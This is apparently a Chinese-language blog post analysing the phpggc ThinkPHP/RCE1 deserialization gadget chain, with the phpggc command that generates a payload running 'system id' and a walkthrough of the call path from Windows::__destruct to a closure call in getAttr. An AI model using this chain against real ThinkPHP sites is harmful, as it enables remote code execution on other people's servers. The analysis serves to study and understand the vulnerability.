---
title: phpggc thinkphp RCE1
date: 2023-06-07 22:21:03
categories:
- PHP
tags:
- Deserialization
- thinkphp
toc: true
image:
  path: /assets/images/php.png
---

> - [php-反序列化格式基础](/posts/php-反序列化格式基础/)
- [php-反序列化绕过](/posts/php-反序列化绕过/)
- [php-反序列化字符逃逸](/posts/php-反序列化字符逃逸/)
- [php-phar-反序列化](/posts/php-phar-反序列化利用/)
- [php-反序列化原生类利用](/posts/php-反序列化原生类利用/)
- [phpggc-利用链分析](/posts/phpggc-thinkphp-利用链分析/)
  - thinkphp
    - [phpggc-thinkphp-RCE1](/posts/phpggc-thinkphp-RCE1/)
    - [phpggc-thinkphp-RCE2](/posts/phpggc-thinkphp-RCE2/)
    - [phpggc-thinkphp-RCE3](/posts/phpggc-thinkphp-RCE3/)
    - [phpggc-thinkphp-RCE4](/posts/phpggc-thinkphp-RCE4/)
    - [phpggc-thinkphp-FW1](/posts/phpggc-thinkphp-FW1/)
    - [phpggc-thinkphp-FW2](/posts/phpggc-thinkphp-FW2/)


## RCE1
影响范围：
- thinkphp 5.1.x-5.2.x
### 使用

```bash
phpggc ThinkPHP/RCE1 system id  -b
```

### 分析
整个调用链如下所示：
```php
think\process\pipes\Windows::__destruct()                                
    | $this->removeFiles();                                    
    | file_exists()                     
    think\model\concern\Conversion::__toString()
        | $this->toJson()
        | $this->toArray()
        | $this->getAttr()
        think\model\concern\Attribute::getAttr()
            | $closure($value, $this->data);   * <---- 
            // 闭包
```

这一条链的 sink 点比较有意思，通过利用闭包函数达成命令执行：
```php
public function getAttr($name, &$item = null)
{
    ...
    if (isset($this->withAttr[$fieldName])) {
        ...
        $closure = $this->withAttr[$fieldName];
        $value   = $closure($value, $this->data);
    } 
    ...
    return $value;
}
```
根据 `$fieldName` 的值，从`$this->withAttr`这个数组中取值来赋值给 `$closure`，然后将`$closure` 当作函数来进行调用，因此只要控制了 `$closure` 就可以执行任意方法例如 system。

这里在执行 system 方法时传入了两个参数，system 的第二个参数用于存储执行后的状态码。
```php
/**
 * Execute an external program and display the output
 * system() is just like the C version of the function in that it executes the given `command` and outputs the result.
 *
 * @param string $command The command that will be executed.
 * @param int|null $result_code If the `result_code` argument is present, then the return status of the executed command will be written to this variable.
 * @return bool|string Returns the last line of the command output on success, and `false` on failure.
 */
function system($command, &$result_code = null): bool|string { /* function body is hidden */ }
```

向上查找 getAttr 函数，可以找到相当多的调用点。phpggc 使用的这条链可以追溯到`think\model\concern\Conversion::__toString()` 
```php
think\model\concern\Conversion::__toString()
    | $this->toJson()
    | $this->toArray()
    | $this->getAttr()
```

toString 方法的常用触发点有以下的几种：
- echo (`$obj`) / print(`$obj`) 打印时会触发
- 反序列化对象与字符串连接时
- 反序列化对象参与格式化字符串时
- 反序列化对象与字符串进行\==比较时（PHP进行==比较的时候会转换参数类型）
- 反序列化对象参与格式化SQL语句，绑定参数时
- 反序列化对象在经过php字符串函数，如 strlen()、addslashes()时
- 在in_array()方法中，第一个参数是反序列化对象，第二个参数的数组中有 toString返回的字符串的时候 toString 会被调用
- 反序列化的对象作为 class_exists() 的参数的时候
- 作为 **file_exists()** 函数时也会触发

正好 `think\process\pipes\Windows::__destruct` 这个反序列化入口点会执行 removeFiles 函数，removeFiles 函数中就会调用 file_exists。
```php
private function removeFiles()
{
    foreach ($this->files as $filename) {
        if (file_exists($filename)) {
            @unlink($filename);
        }
    }
    $this->files = [];
}
```
整条链较为简单，但需要注意几个点，利用链中利用到的 `think\model\concern\Conversion` 和`think\model\concern\Attribute` 并不是一个类，而是 trait。从 PHP 的 5.4.0 版本开始,PHP 提供了一种全新的代码复用的概念,那就是Trait，简单来说就是把多个类中可能共用的方法或者属性都抽取出来，以实现代码的复用。在反序列化的利用中，trait 是无法进行反序列化的，因此在构造利用链时需要找到使用了这两个 trait 的类。

搜索后发现只有 Model 使用了这两个 trait，但 Model 是一个抽象类，也无法直接序列化，因此只能使用其子类 Pivot
```php
abstract class Model implements \JsonSerializable, \ArrayAccess
{
    use model\concern\Attribute;
    use model\concern\RelationShip;
    use model\concern\ModelEvent;
    use model\concern\TimeStamp;
    use model\concern\Conversion;

```